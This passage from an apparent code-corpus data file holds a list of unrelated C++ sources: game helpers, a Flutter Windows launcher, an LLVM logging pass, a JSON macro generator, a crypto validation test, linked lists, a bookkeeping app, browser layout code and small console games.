pos[team][i][0]) : pos[team][i][0] ;\n            double multiple = left / (double)stats[team][i].get_b().get_speed() ;\n            min_multiple = (min_multiple > multiple) ? multiple : min_multiple;\n            closest = (min_multiple > multiple) ? i : closest;\n\n            std::cout << team << \" \" << i << \" \" << left << \" \" << multiple << \" \" << stats[team][i].get_b().get_speed() << \" \" << min_multiple << std::endl;\n    }\n\n    return closest;\n}\n\nint get_furthest_to_action(\n    std::vector<std::vector<std::vector<int>>> & pos,\n    std::vector<std::vector<hero>> & stats,\n    int team\n) {\n\n    int furthest = 0;\n    double max_multiple = 0;\n\n    for(int i = 0; i < pos[team].size(); i++) {\n            double left = (pos[team][i][1]) ? (100 - pos[team][i][0]) : pos[team][i][0] ;\n            double multiple = left / (double)stats[team][i].get_b().get_speed() ;\n            max_multiple = (max_multiple < multiple) ? multiple : max_multiple;\n            furthest = (max_multiple < multiple) ? multiple : max_multiple;\n\n            std::cout << team << \" \" << i << \" \" << left << \" \" << multiple << \" \" << stats[team][i].get_b().get_speed() << \" \" << max_multiple << std::endl;\n    }\n\n    return furthest;\n}\n\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"learn\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"llvm/IR/Function.h\"\n#include \"llvm/IR/IRBuilder.h\"\n#include \"llvm/IR/InstrTypes.h\"\n#include \"llvm/IR/LegacyPassManager.h\"\n#include \"llvm/IR/Module.h\"\n#include \"llvm/Pass.h\"\n#include \"llvm/Support/raw_ostream.h\"\n#include \"llvm/Transforms/IPO/PassManagerBuilder.h\"\n#include \"llvm/Transforms/Utils/BasicBlockUtils.h\"\nusing namespace llvm;\n\nnamespace {\n\n  struct IrCollector : public FunctionPass {\n    static char ID;\n\n    IrCollector() : FunctionPass(ID) {}\n\n    bool is_logger(StringRef name) {\n      return name == \"func_start_logger\" || name == \"func_end_logger\"     || \n             name == \"call_logger\"       || name == \"bin_op_logger\"       || \n             name == \"load_logger\"       || name == \"store_logger\"        || \n             name == \"cast_logger\"       || name == \"unreachable_logger\"  ||\n             name == \"uncond_br_logger\"  || name == \"cond_br_logger\"      ||\n             name == \"bb_start_logger\"   || name == \"alloca_logger\"       ||\n             name == \"icmp_logger\"       || name == \"getelementptr_logger\";}\n\n    virtual bool runOnFunction(Function& F) {\n      if (is_logger(F.getName()))\n        return false;\n\n      //--------------------------------------------------------------------------\n      // Builder\n      //--------------------------------------------------------------------------\n      LLVMContext& ctx = F.getContext();\n      IRBuilder<> builder (ctx);\n      Type* void_ret_type = Type::getVoidTy(ctx);\n\n      //--------------------------------------------------------------------------\n      // Prepare call to func_start_logger\n      //--------------------------------------------------------------------------\n      ArrayRef<Type*> func_start_param_types = {builder.getInt8Ty()->getPointerTo()}; // func_name\n\n      auto* func_start_log_type = FunctionType::get(void_ret_type, func_start_param_types, false);\n      FunctionCallee func_start_log = F.getParent()->getOrInsertFunction(\"func_start_logger\", func_start_log_type);\n\n      //--------------------------------------------------------------------------\n      // Prepare call to func_end_logger\n      //--------------------------------------------------------------------------\n      ArrayRef<Type*> func_end_param_types = {builder.getInt8Ty()->getPointerTo(), // func_name\n                                              Type::getInt64Ty(ctx)};              // inst_addr\n\n      auto* func_end_log_type = FunctionType::get(void_ret_type, func_end_param_types, false);\n      FunctionCallee func_end_log = F.getParent()->getOrInsertFunction(\"func_end_logger\", func_end_log_type);\n\n      //--------------------------------------------------------------------------\n      // Prepare call to call_logger\n      //--------------------------------------------------------------------------\n      ArrayRef<Type*> call_param_types = {builder.getInt8Ty()->getPointerTo(), // func_name\n                                          builder.getInt8Ty()->getPointerTo(), // callee_name\n                                          Type::getInt64Ty(ctx)};              // inst_addr\n\n      auto* call_log_type = FunctionType::get(void_ret_type, call_param_types, false);\n      FunctionCallee call_log = F.getParent()->getOrInsertFunction(\"call_logger\", call_log_type);\n\n      //--------------------------------------------------------------------------\n      // Prepare call to bin_op_logger\n      //--------------------------------------------------------------------------\n      ArrayRef<Type*> bin_op_param_types = {builder.getInt8Ty()->getPointerTo(), // func_name\n                                            Type::getInt32Ty(ctx),               // val\n                                            Type::getInt32Ty(ctx),               // lhs\n                                            Type::getInt32Ty(ctx),               // rhs\n                                            builder.getInt8Ty()->getPointerTo(), // op_name\n                                            Type::getInt64Ty(ctx)};              // inst_addr\n\n      auto* bin_op_log_type = FunctionType::get(void_ret_type, bin_op_param_types, false);\n      FunctionCallee bin_op_log = F.getParent()->getOrInsertFunction(\"bin_op_logger\", bin_op_log_type);\n\n      //--------------------------------------------------------------------------\n      // Prepare call to load_logger\n      //--------------------------------------------------------------------------\n      ArrayRef<Type*> load_param_types = {builder.getInt8Ty()->getPointerTo(), // func_name\n                                          Type::getInt32Ty(ctx),               // val\n                                          Type::getInt64Ty(ctx),               // p_operand\n                                          Type::getInt64Ty(ctx)};              // inst_addr\n\n      auto* load_log_type = FunctionType::get(void_ret_type, load_param_types, false);\n      FunctionCallee load_log = F.getParent()->getOrInsertFunction(\"load_logger\", load_log_type);\n\n      //-------------------------------------",
    "#include <cstdlib>\n#include <iostream>\n#include <sstream>\n\nusing namespace std;\n\nvoid build_code(int max_args)\n{\n    stringstream ss;\n    ss << \"#define NLOHMANN_JSON_EXPAND( x ) x\" << endl;\n    ss << \"#define NLOHMANN_JSON_GET_MACRO(\";\n    for (int i = 0 ; i < max_args ; i++)\n        ss << \"_\" << i + 1 << \", \";\n    ss << \"NAME,...) NAME\" << endl;\n    \n    ss << \"#define NLOHMANN_JSON_PASTE(...) NLOHMANN_JSON_EXPAND(NLOHMANN_JSON_GET_MACRO(__VA_ARGS__, \\\\\" << endl;\n    for (int i = max_args ; i > 1 ; i--)\n        ss << \"NLOHMANN_JSON_PASTE\" << i << \", \\\\\" << endl;\n    ss << \"NLOHMANN_JSON_PASTE1)(__VA_ARGS__))\" << endl;\n    \n    ss << \"#define NLOHMANN_JSON_PASTE2(func, v1) func(v1)\" << endl;\n    for (int i = 3 ; i <= max_args ; i++)\n    {\n        ss << \"#define NLOHMANN_JSON_PASTE\" << i << \"(func, \"; \n        for (int j = 1 ; j < i -1 ; j++)\n            ss << \"v\" << j << \", \"; \n        ss << \"v\" << i-1 << \") NLOHMANN_JSON_PASTE2(func, v1) NLOHMANN_JSON_PASTE\" << i-1 << \"(func, \";\n        for (int j = 2 ; j < i-1 ; j++)\n            ss << \"v\" << j << \", \";\n        ss << \"v\" << i-1 << \")\" << endl;\n    }\n    \n    cout << ss.str() << endl;\n}\n\nint main(int argc, char** argv) \n{\n    int max_args = 64;\n    build_code(max_args);\n       \n    return 0;\n}\n\n",
    "// Copyright (c) 2024 Marco Fortina\n// Distributed under the MIT software license, see the accompanying\n// file COPYING or https://www.opensource.org/licenses/mit-license.php.\n\n// Include Qyra library\n#include \"../src/utils.h\"\n#include <qyra.h>\n\n#include <cstddef>\n#include <iostream>\n#include <sstream>\n#include <stdexcept>\n#include <stdint.h>\n#include <string>\n#include <vector>\n\n/**\n * @brief Convert a hexadecimal string to a std::vector<unsigned char>.\n *\n * This function assumes that the input string contains only valid hexadecimal characters\n * and has an even length (each byte is represented by two hex characters).\n *\n * @param hexString The input hexadecimal string to convert.\n * @return A std::vector<unsigned char> containing the bytes from the input hexadecimal string.\n * @throws std::invalid_argument if the input string is not a valid hexadecimal string.\n */\nstd::vector<unsigned char> hexStringToVector(const std::string& hexString)\n{\n    // Check if the length of the hex string is even\n    if (hexString.length() % 2 != 0) {\n        throw std::invalid_argument(\"Hex string must have an even length.\");\n    }\n\n    std::vector<unsigned char> result(hexString.length() / 2);\n    std::istringstream hexStream(hexString);\n    std::string byteString;\n\n    for (std::size_t i = 0; i < result.size(); ++i) {\n        // Read the next two characters from the hex string\n        byteString = hexString.substr(2 * i, 2);\n\n        // Convert the hex string to a byte\n        unsigned int byte;\n        std::istringstream(byteString) >> std::hex >> byte;\n        result[i] = static_cast<unsigned char>(byte);\n    }\n\n    return result;\n}\n\n/**\n * @brief Main function that initializes a CQYRA object, sets the header and nonce,\n * and validates a predefined solution.\n *\n * The main function does the following steps:\n * - Initializes a CQYRA object.\n * - Sets the block header and nonce to specific values.\n * - Validates a predefined solution.\n *\n * @note The public key is defined as an array of 1184 bytes and is used for encryption\n *       or verification purposes within the CQYRA algorithm. The secret key is defined\n *       as an array of 2400 bytes and is used for decryption or signing.\n *\n * @return int Program exit status.\n */\nint main()\n{\n    // Public key.\n    uint8_t public_key[1184] =\n        {\n            0x89, 0xec, 0x16, 0x38, 0xd4, 0x1b, 0xe0, 0x10,\n            0x3e, 0x9d, 0xa3, 0x4e, 0x53, 0x82, 0xc7, 0xa0,\n            0xf2, 0x61, 0x12, 0x0a, 0x14, 0xdb, 0x74, 0x9d,\n            0x33, 0x01, 0x7f, 0xc9, 0x19, 0x59, 0x12, 0x6a,\n            0x33, 0x40, 0x3b, 0x7a, 0xc0, 0xea, 0x10, 0xf8,\n            0xc3, 0xb3, 0xef, 0x50, 0x5c, 0xa5, 0x81, 0x1f,\n            0x36, 0x65, 0xc7, 0x14, 0x98, 0x28, 0x56, 0xcb,\n            0xba, 0x0d, 0xe8, 0xaa, 0xf3, 0x90, 0x03, 0x1c,\n            0xd3, 0xb0, 0x32, 0x40, 0x52, 0xeb, 0xf7, 0x50,\n            0xa4, 0x3b, 0x0e, 0x5b, 0x4b, 0x41, 0x66, 0x0b,\n            0xba, 0x05, 0xc1, 0x95, 0x21, 0x9b, 0x13, 0x61,\n            0x7c, 0x1b, 0xa2, 0x43, 0xc1, 0xad, 0x5b, 0x18,\n            0x1a, 0x58, 0x71, 0x48, 0x18, 0x8a, 0x07, 0x31,\n            0x78, 0x49, 0x92, 0xac, 0xf3, 0x5b, 0xa1, 0x6c,\n            0xeb, 0x50, 0x76, 0x92, 0x3a, 0x3a, 0x91, 0xa7,\n            0x8f, 0x31, 0x85, 0xcb, 0x5c, 0x22, 0x97, 0x69,\n            0xae, 0x5f, 0x6c, 0xa1, 0xbc, 0x42, 0x5e, 0x89,\n            0xba, 0x69, 0x29, 0xf7, 0x18, 0xd9, 0x28, 0x03,\n            0x05, 0xe6, 0x42, 0xbf, 0x68, 0x92, 0xc4, 0x09,\n            0x3a, 0x3e, 0x3c, 0x39, 0xd4, 0x61, 0xc8, 0x95,\n            0x45, 0xcf, 0x47, 0x81, 0x10, 0x32, 0xa3, 0xbb,\n            0xef, 0xf2, 0x46, 0xae, 0x7c, 0x9a, 0x9a, 0x10,\n            0x5f, 0x67, 0xa0, 0x9a, 0xe4, 0x0a, 0x3f, 0x0f,\n            0x10, 0x42, 0x32, 0x57, 0xae, 0xdf, 0x6a, 0x13,\n            0xca, 0x1b, 0xcb, 0x44, 0x31, 0x6e, 0x2a, 0x3b,\n            0xc6, 0x0e, 0x5c, 0x44, 0xf8, 0x59, 0x56, 0xe9,\n            0x1c, 0x72, 0x21, 0xa5, 0x7d, 0x87, 0x35, 0x04,\n            0x46, 0x68, 0x20, 0x39, 0x36, 0xcc, 0xfa, 0x28,\n            0xa6, 0xec, 0x66, 0x54, 0x16, 0x3a, 0x1c, 0xd8,\n            0xf9, 0x4a, 0x46, 0xea, 0x90, 0x1c, 0xb9, 0x74,\n            0x35, 0x4b, 0xa6, 0x87, 0xf2, 0x14, 0x73, 0xd2,\n            0x01, 0x88, 0x73, 0x6b, 0x84, 0x25, 0xbc, 0xa6,\n            0x03, 0xcd, 0xf8, 0xc2, 0x14, 0xfb, 0x78, 0xc2,\n            0xf3, 0x87, 0x62, 0xcf, 0x1c, 0x81, 0x3b, 0x19,\n            0xba, 0x0c, 0x6b, 0x85, 0x79, 0x0a, 0x90, 0x92,\n            0xc5, 0x83, 0x2c, 0x73, 0xc6, 0xff, 0xf0, 0x41,\n            0x08, 0xd8, 0x81, 0xda, 0x4b, 0xab, 0x40, 0x05,\n            0x4d, 0x45, 0x21, 0x24, 0x93, 0x29, 0x96, 0x80,\n            0xe5, 0x02, 0x06, 0xd7, 0x3c, 0x22, 0x27, 0x63,\n            0xe4, 0x19, 0x64, 0x93, 0x85, 0x33, 0x5d, 0x60,\n            0x74, 0xb8, 0x66, 0x0f, 0x69, 0xa8, 0x2c, 0x5a,\n            0x99, 0xbc, 0x7c, 0x59, 0x8c, 0x5e, 0x43, 0x3d,\n            0x23, 0x72, 0xbd, 0x50, 0xdc, 0x0d, 0x75, 0x98,\n            0x92, 0x28, 0xca, 0x42, 0x11, 0x52, 0x56, 0x13,\n            0x60, 0x74, 0xd8, 0xb0, 0x",
    "#include<bits/stdc++.h>\nusing namespace std;\nconstexpr int N = 1e6+10;\nint e[N],head,ne[N],ind;\nvoid init(){\n    head=-1;\n    ind=0;\n}\nvoid add_to_head(int x){\n    e[ind]=x;\n    ne[ind]=head;\n    head=ind++;\n}\nvoid del(int k){\n    ne[k]=ne[ne[k]];\n}\nvoid ins(int k,int x){\n    e[ind]=x;\n    ne[ind]=ne[k];\n    ne[k]=ind;\n    ind++;\n}\nvoid delhead(){\n    head=ne[head];\n}\n\nclass LinkedList {\npublic:\n\tLinkedList(int N) : N(N), next(N) { clear(); }\n\tvoid clear() { head.assign(N, -1); }\n\tint front(int h) { return head[h]; }\n\tvoid pop(int h) { head[h] = next[head[h]]; }\n\tvoid push(int h, int u) { next[u] = head[h], head[h] = u; }\nprivate:\n\tint N;\n\tvector<int> next, head;\n};\n \nclass DoublyLinkedList {\nprivate:\n\tstruct Node { int prev, next; };\npublic:\n\tDoublyLinkedList(int N) : N(N), nodes(N) { clear(); }\n\tvoid clear() { head.assign(N, -1); }\n\tvoid erase(int h, int u) {\n\t\tint pv = nodes[u].prev, nx = nodes[u].next;\n\t\tif (nx >= 0) nodes[nx].prev = pv;\n\t\tif (pv >= 0) nodes[pv].next = nx;\n\t\telse head[h] = nx;\n\t}\n\tvoid insert(int h, int u) {\n\t\tnodes[u] = { -1, head[h]};\n\t\tif (head[h] >= 0) nodes[head[h]].prev = u;\n\t\thead[h] = u;\n\t}\n\ttemplate <typename Func>\n\tvoid erase_all(int first, int last, Func f) {\n\t\tfor (int i = first; i <= last; ++i) {\n\t\t\tfor (int h = head[i]; h >= 0; h = nodes[h].next) f(h);\n\t\t\thead[i] = -1;\n\t\t}\n\t}\nprivate:\n\tint N;\n\tvector<int> head;\n\tvector<Node> nodes;\n};\n ",
    "//\u5bf9\u4e8e\u67e5\u8d26\uff0c\u8bb0\u8d26\u529f\u80fd\u51fd\u6570\u7684\u5b9e\u73b0\n#include \"common.h\"\n#include \"account_item.h\"\n\nvoid loadDataFromFile(vector<AccountItem>& items)\n{\n\t//\u8bfb\u53d6\u5bf9\u5e94\u7684\u6587\u4ef6\u6570\u636e\uff08ifstream\u5bf9\u8c61-->vector\u4e2d\uff09\n\tifstream input(FILENAME);\n\tAccountItem item;\n\twhile (input>>item.itemType>>item.amount>>item.detail)\n\t{\n\t\titems.push_back(item);\n\t}\n\tinput.close();\n}\n\nvoid accounting(vector<AccountItem>& items)\n{\n\tchar key = readMenuSelection(3);\n\tswitch (key)\n\t{\n\tcase '1':\n\t\tincome(items);\n\t\tbreak;\n\tcase '2':\n\t\texpand(items);\n\t\tbreak;\n\tcase '3':\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\t}\n}\n\nvoid insertInfoFile(AccountItem& item)\n{\n\tofstream output(FILENAME, ios::out | ios::app);\n\toutput << item.itemType << \"\\t\" << item.amount << \"\\t\" << item.detail << endl;\n\toutput.close();\n}\n//1.\u8bb0\u5f55\u529f\u80fd\n//\u8bb0\u5f55\u6bcf\u7b14\u6536\u5165\nvoid income(vector<AccountItem>& items)\n{\n\tAccountItem item;\n\titem.itemType = INCOME;\n\tcout << \"\\n\u672c\u6b21\u7684\u6536\u5165\u4e3a\uff1a\";\n\titem.amount = readAccount();\n\n\tcout << \"\\n\u5907\u6ce8\u4e3a\uff1a\";\n\tgetline(cin,item.detail);\n\t// \u6dfb\u52a0\u5230vector\u4e2d\n\titems.push_back(item);\n\t// \u5199\u5165\u6587\u4ef6\u505a\u6301\u4e45\u5316\u4fdd\u5b58\n\tinsertInfoFile(item);\n\n\t// \u663e\u793a\u6210\u529f\u4fe1\u606f\n\tcout << \"\\n------------------------\u8bb0\u8d26\u6210\u529f\uff01--------------------------\\n\" << endl;\n\tcout << \"\\n\u8bf7\u6309\u56de\u8f66\u952e\u8fd4\u56de\u4e3b\u83dc\u5355...\" << endl;\n\n\tstring line;\n\tgetline(cin, line);\n\n}\n\n//\u8bb0\u5f55\u652f\u51fa\nvoid expand(vector<AccountItem>& items)\n{\n\tAccountItem item;\n\titem.itemType = EXPAND;\n\tcout << \"\\n\u672c\u6b21\u652f\u51fa\u91d1\u989d\uff1a\";\n\titem.amount = readAccount();\n\n\tcout << \"\\n\u5907\u6ce8\u4e3a\uff1a\";\n\tgetline(cin,item.detail);\n\titems.push_back(item);\n\n\tinsertInfoFile(item);\n\t// \u663e\u793a\u6210\u529f\u4fe1\u606f\n\tcout << \"\\n------------------------\u8bb0\u8d26\u6210\u529f\uff01--------------------------\\n\" << endl;\n\tcout << \"\\n\u8bf7\u6309\u56de\u8f66\u952e\u8fd4\u56de\u4e3b\u83dc\u5355...\" << endl;\n\n\tstring line;\n\tgetline(cin,line);\n}\n\n//2.\u67e5\u8be2\u529f\u80fd\nvoid query(const vector<AccountItem>& items)\n{\n\tchar key = readMenuSelection(4);\n\n\tswitch (key)\n\t{\n\tcase '1':   // 1 - \u67e5\u8be2\u6240\u6709\u8d26\u76ee\uff0c\u5e76\u7edf\u8ba1\u603b\u6536\u652f\n\t\tqueryItems(items);\n\t\tbreak;\n\tcase '2':   // 2 - \u67e5\u8be2\u6536\u5165\uff0c\u7edf\u8ba1\u603b\u6536\u5165\n\t\tqueryItems(items, INCOME);\n\t\tbreak;\n\tcase '3':   // 3 - \u67e5\u8be2\u652f\u51fa\uff0c\u7edf\u8ba1\u603b\u652f\u51fa\n\t\tqueryItems(items, EXPAND);\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\t}\n}\nvoid queryItems(const vector<AccountItem>& items)\n{\n\tcout << \"---------------- \u67e5\u8be2\u7ed3\u679c ---------------------\" << endl;\n\tcout << \"\\n\u7c7b\u578b\\t\\t\u91d1\u989d\\t\\t\u5907\u6ce8\\n\" << endl;\n\n\t// \u904d\u5386\u6240\u6709\u8d26\u76ee\uff0c\u7edf\u8ba1\u603b\u6536\u652f\n\tint total = 0;\n\tfor (auto item : items)\n\t{\n\t\tprintItems(item);\n\t\ttotal += item.amount;\n\t}\n\n\t// \u8f93\u51fa\u4fe1\u606f\n\tcout << \"===================================================\\n\" << endl;\n\tcout << \"\u603b\u6536\u652f\uff1a\" << total << endl;\n\tcout << \"\\n\u8bf7\u6309\u56de\u8f66\u952e\u8fd4\u56de\u4e3b\u83dc\u5355...\" << endl;\n\n\tstring line;\n\tgetline(cin, line);\n\n}\nvoid queryItems(const vector<AccountItem>& items, const string itemType)\n{\n\tcout << \"---------------- \u67e5\u8be2\u7ed3\u679c ---------------------\" << endl;\n\tcout << \"\\n\u7c7b\u578b\\t\\t\u91d1\u989d\\t\\t\u5907\u6ce8\\n\" << endl;\n\tint total = 0;\n\tfor (auto item : items)\n\t{\n\t\tif (item.itemType != itemType) continue;\t\n\t\tprintItems(item);\n\t\ttotal += item.amount;\n\t\t\n\t}\n\tcout << \"===================================================\\n\" << endl;\n\tcout << ((itemType == INCOME) ? \"\u603b\u6536\u5165\uff1a\" : \"\u603b\u652f\u51fa\uff1a\") << total << endl;\n\tcout << \"\\n\u8bf7\u6309\u56de\u8f66\u952e\u8fd4\u56de\u4e3b\u83dc\u5355...\" << endl;\n\tstring line;\n\tgetline(cin,line);\n}\nvoid printItems(const AccountItem& item)\n{\n\tcout << item.itemType << \"\\t\\t\" << item.amount << \"\\t\\t\" << item.detail << endl;\n}\n\n",
    "#include <Browser/Elements/PageElement.h>\n#include <Browser/Style.h>\n#include <Browser/Document.h>\n#include <Browser/Renderer.h>\n#include <Browser/StyleFactory.h>\n#include <Browser/Cursor.h>\n\n\nusing namespace sb;\n\n\n////////////////////////////////////////////////////////////////////////////////////////////////////\nPageElement::PageElement(const char* tag, Document* doc, PageElement* parent):\n    mTag(tag), mDocument(doc), mParent(parent)\n{\n}\n\n////////////////////////////////////////////////////////////////////////////////////////////////////\nDisplayType PageElement::GetDisplayType() const\n{\n    if (mStyle && mStyle->Has(StylePropertyId_Display))\n    {\n        return Unbox<DisplayType>(mStyle->Get(StylePropertyId_Display));\n    }\n    return DisplayType_Block;\n}\n\n////////////////////////////////////////////////////////////////////////////////////////////////////\nvoid PageElement::OnMouseMove(float x, float y)\n{\n    bool handled = false;\n\n    if (mStyle)\n    {\n        // Handle the cursor: property\n        if (mStyle->Has(StylePropertyId_Cursor))\n        {\n            Cursor cursor = Unbox<Cursor>(mStyle->Get(StylePropertyId_Cursor));\n            if (mDocument->GetMouseCursor() != cursor)\n            {\n                handled = true;\n                mDocument->SetMouseCursor(cursor);\n            }\n        }\n        else if (mDocument->GetMouseCursor() != Cursor_Default)\n        {\n            mDocument->SetMouseCursor(Cursor_Default);\n        }\n    }\n\n    // If we haven't handled the event in this element, forward it to relevant children\n    if (!handled)\n    {\n        for (auto& child: mChildren)\n        {\n            if (child->GetContentBounds().Contains(x, y))\n            {\n                child->OnMouseMove(x, y);\n            }\n        }\n    }\n}\n\n////////////////////////////////////////////////////////////////////////////////////////////////////\nvoid PageElement::OnMouseDown(float x, float y)\n{\n    bool handled = false;\n\n    // Link has been clicked\n    if (mTag == \"a\")\n    {\n        std::string link = mAttributes[\"href\"];\n        printf(\"Clicked on: %s\\n\", link.c_str());\n        handled = true;\n    }\n\n    // Forward the event to the relevant children\n    if (!handled)\n    {\n        for (auto& child: mChildren)\n        {\n            if (child->GetContentBounds().Contains(x, y))\n            {\n                child->OnMouseDown(x, y);\n            }\n        }\n    }\n}\n\n////////////////////////////////////////////////////////////////////////////////////////////////////\nPoint PageElement::Arrange(const Rect& availableSpace, Point cursor, float blockAdvance)\n{\n    mStyle = mDocument->GetStyleFactory().ComputeStyle(this);\n\n    Thickness margin, padding;\n    if (mStyle->Has(StylePropertyId_Margin))\n    {\n        margin = Unbox<Thickness>(mStyle->Get(StylePropertyId_Margin));\n    }\n    if (mStyle->Has(StylePropertyId_Padding))\n    {\n        padding = Unbox<Thickness>(mStyle->Get(StylePropertyId_Padding));\n    }\n\n    // Calculate the available space for this element and it's children & position the \"cursor\"\n    Rect contentSpace = availableSpace;\n    contentSpace.x = cursor.x + margin.left + padding.left;\n    contentSpace.y = cursor.y + margin.top + padding.top;\n    contentSpace.width -= (cursor.x - availableSpace.x) + margin.left + padding.left + margin.right + padding.right;\n    contentSpace.height -= (cursor.y - availableSpace.y) + margin.top + padding.top + margin.bottom + padding.bottom;\n\n    DisplayType display = GetDisplayType();\n    if (display == DisplayType_Block)\n    {\n        // If this element is display:block, move the cursor to the left most side and by Y coord\n        contentSpace.x = availableSpace.x + margin.left + padding.left;\n        contentSpace.y = cursor.y + blockAdvance + margin.top + padding.top;\n        cursor.x = contentSpace.x;\n        cursor.y = contentSpace.y;\n    }\n\n    Point myCursor = cursor; // Store the original cursor position\n\n    float childrenRight = contentSpace.x;\n    float childrenBottom = contentSpace.y;\n    float childBlockHeight = 0.0f;\n\n    for (auto& child : mChildren)\n    {\n        cursor = child->Arrange(contentSpace, cursor, childBlockHeight);\n\n        // Get the max positions of the space taken by this child\n        const Rect& lb = child->GetLayoutBounds();\n        childrenBottom = std::max<float>(childrenBottom, lb.y + lb.height);\n        childrenRight = std::max<float>(childrenRight, lb.x + lb.width);\n\n        // Based on display, update the y advance for the element\n        DisplayType childDisplay = child->GetDisplayType();\n        if (childDisplay == DisplayType_Inline)\n        {\n            childBlockHeight = std::max<float>(lb.height, childBlockHeight);\n        }\n        else\n        {\n            childBlockHeight = lb.height;\n        }\n    }\n\n    // Store the layout values for this element\n    mLayoutBounds = Thickness(myCursor.x - margin.left - padding.left,\n        myCursor.y - margin.top - padding.top,\n        childrenRight + margin.right + padding.right",
    "\ufeff#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nconst int SIZE = 3;\r\nchar board[SIZE][SIZE] = { {'1', '2', '3'}, {'4', '5', '6'}, {'7', '8', '9'} };\r\n\r\nvoid lovhe() \r\n{\r\n    cout << \"-------------\\n\";\r\n    for (int i = 0; i < SIZE; ++i) \r\n    {\r\n        for (int j = 0; j < SIZE; ++j) \r\n        {\r\n            cout << \" \" << board[i][j] << \" \";\r\n            if (j < SIZE - 1) cout << \"|\";\r\n        }\r\n        cout << \"\\n-------------\\n\";\r\n    }\r\n}\r\n\r\nbool hereket(int move) {\r\n    return (move >= 1 && move <= 9 && board[(move - 1) / SIZE][(move - 1) % SIZE] != 'X' && board[(move - 1) / SIZE][(move - 1) % SIZE] != 'O');\r\n}\r\n\r\nvoid hereketet(char player, int move) \r\n{\r\n    board[(move - 1) / SIZE][(move - 1) % SIZE] = player;\r\n}\r\n\r\nbool qazananitap(char player) \r\n{\r\n    for (int i = 0; i < SIZE; ++i)\r\n    {\r\n        if (board[i][0] == player && board[i][1] == player && board[i][2] == player) return true;\r\n        if (board[0][i] == player && board[1][i] == player && board[2][i] == player) return true;\r\n    }\r\n    if (board[0][0] == player && board[1][1] == player && board[2][2] == player) return true;\r\n    if (board[0][2] == player && board[1][1] == player && board[2][0] == player) return true;\r\n    return false;\r\n}\r\n\r\nbool beraberetap() {\r\n    for (int i = 0; i < SIZE; ++i) \r\n    {\r\n        for (int j = 0; j < SIZE; ++j) \r\n        {\r\n            if (board[i][j] != 'X' && board[i][j] != 'O') return false;\r\n        }\r\n    }\r\n    return true;\r\n}\r\n\r\nint main() \r\n{\r\n    char player = 'X';\r\n    int move;\r\n\r\n    while (true) \r\n    {\r\n        lovhe();\r\n        cout << \"Oyuncu \" << player << \", hansi hisseye oynamaq istediyinizi daxil edin (1 - 9): \";\r\n        cin >> move;\r\n\r\n        if (hereket(move)) \r\n        {\r\n            hereketet(player, move);\r\n\r\n            if (qazananitap(player)) {\r\n                lovhe();\r\n                cout << \"Oyuncu \" << player << \" qazandi!\\n\";\r\n                break;\r\n            }\r\n\r\n            if (beraberetap()) \r\n            {\r\n                lovhe();\r\n                cout << \"Oyun bitdi ( Berabere )\\n\";\r\n                break;\r\n            }\r\n\r\n            player = (player == 'X') ? 'O' : 'X';\r\n        }\r\n        else {\r\n            cout << \"yanlis hereket. yeniden cehd edin.\\n\";\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n \r\n//internetden axtaris etdim",
    "#include<bits/stdc++.h>\nusing namespace std;\n\n\nclass Guesser{\n    int guessed_num;\n    public:\n        int takeguesserinput(){\n            cout<<\"Give the number for the guesser ---> \";\n            int x;\n            cin>>x;\n            guessed_num = x;\n            return guessed_num;\n        }\n};\n\nclass Player{\n    \n    int playernum;\n    public:\n        int takeplayerinput( int x){\n            int p;\n            cout<<\"Give the number guessed by the player \"<<x<<\" ---> \"<<endl;\n            cin>>p;\n            playernum = p;\n            return playernum;\n        }\n\n};\n\nclass Umpire{\n\n    public:\n    int g;\n    int p1num, p2num , p3num;\n\n        void get_the_number_from_guesser(){\n            Guesser g1;\n            g = g1.takeguesserinput();\n            // cout<<\"Number guessed by guesser \"<<g<<endl;\n        }\n\n        void get_the_number_from_player(){\n            Player p1, p2, p3;\n            p1num = p1.takeplayerinput(1);\n            p2num = p2.takeplayerinput(2);\n            p3num = p3.takeplayerinput(3);\n        }\n\n        void print_the_result(){\n            // \n            if(p1num == g and p2num == g and p3num == g){\n                cout<<\"Player 1 , Player 2, Player 3 won the game\"<<endl;\n            }\n             if(p1num == g){\n                cout<<\"Player 1 Won the Game \"<<endl;\n            }\n             if(p2num == g){\n                cout<<\"Player 2 Won the game\"<<endl;\n            }\n            if(p3num == g){\n                cout<<\"Player 3 Won the game\"<<endl;\n            }\n            if(p1num != g and p2num != g and p3num != g){\n                cout<<\"All Players lost the Game\"<<endl;\n            }\n        }\n        \n\n};\n\n\n\n\nint main(){\n    \n    cout<<\"<----- Welcome to Number Guessing Game ----->\"<<endl;\n    cout<<\"       <--- Let's Start the Game --->        \"<<endl;\n\n     \n    Umpire u;\n    u.get_the_number_from_guesser();\n    u.get_the_number_from_player();\n    u.print_the_result();\n\n     \n\n\n\n\n    cout<<\"<----------- End Game ----------->\"<<endl;\n    return 0;\n}",
